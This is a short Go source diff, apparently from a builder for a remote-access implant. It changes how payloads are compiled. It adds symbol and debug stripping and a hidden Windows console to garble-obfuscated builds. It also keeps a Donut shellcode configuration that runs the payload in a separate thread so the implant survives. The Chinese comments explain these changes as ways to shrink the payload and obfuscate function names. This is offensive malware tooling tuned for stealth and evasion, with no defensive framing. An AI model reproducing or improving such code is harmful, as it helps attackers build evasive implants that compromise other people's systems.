@@ -804,10 +804,14 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 		if buildTags != "" {
 			garbleArgs = append(garbleArgs, "-tags", buildTags)
 		}
-		// Windows 植入端默认无窗口（-H windowsgui 是 build 的 flag，须放在 build 之后）
+		// ldflags 与标准 go build 保持一致：必须带 -s -w（去符号表与 DWARF）与 -buildid=，
+		// 否则 garble 产物会保留全部调试信息 —— 实测同一载荷 "仅 -H windowsgui" 是 12.29MB，
+		// 补上 -s -w -buildid= 后体积与标准构建同量级，且 pclntab 里的函数名已被 garble 混淆。
+		ldflags := "-s -w -buildid="
 		if targetOS == "windows" && os.Getenv("TOSHELL_CONSOLE") == "" {
-			garbleArgs = append(garbleArgs, "-ldflags", "-H windowsgui")
+			ldflags += " -H windowsgui"
 		}
+		garbleArgs = append(garbleArgs, "-ldflags", ldflags)
 		garbleArgs = append(garbleArgs, "-o", outputPath, ".")
 		buildCmd := exec.Command("garble", garbleArgs...)
 		buildCmd.Dir = tmpDir
@@ -1209,12 +1213,12 @@ func (b *Builder) generateShellcodeWithDonut(binary []byte, arch, params string)
 		// Thread=1：把 EXE 入口点作为**独立线程**运行，植入体主线程不受影响；
 		// ExitOpt=1（退出线程）而非 2（退出宿主进程）——旧配置 Thread=0 + ExitOpt=2
 		// 会在内存执行的程序结束时调用 RtlExitUserProcess 把植入体一起干掉。
-		Thread:    1,
-		Compress:  1,
-		Unicode:   0,
-		ExitOpt:   1,
-		Format:    1,
-		Bypass:    3,
+		Thread:     1,
+		Compress:   1,
+		Unicode:    0,
+		ExitOpt:    1,
+		Format:     1,
+		Bypass:     3,
 		Parameters: params,
 	}
 
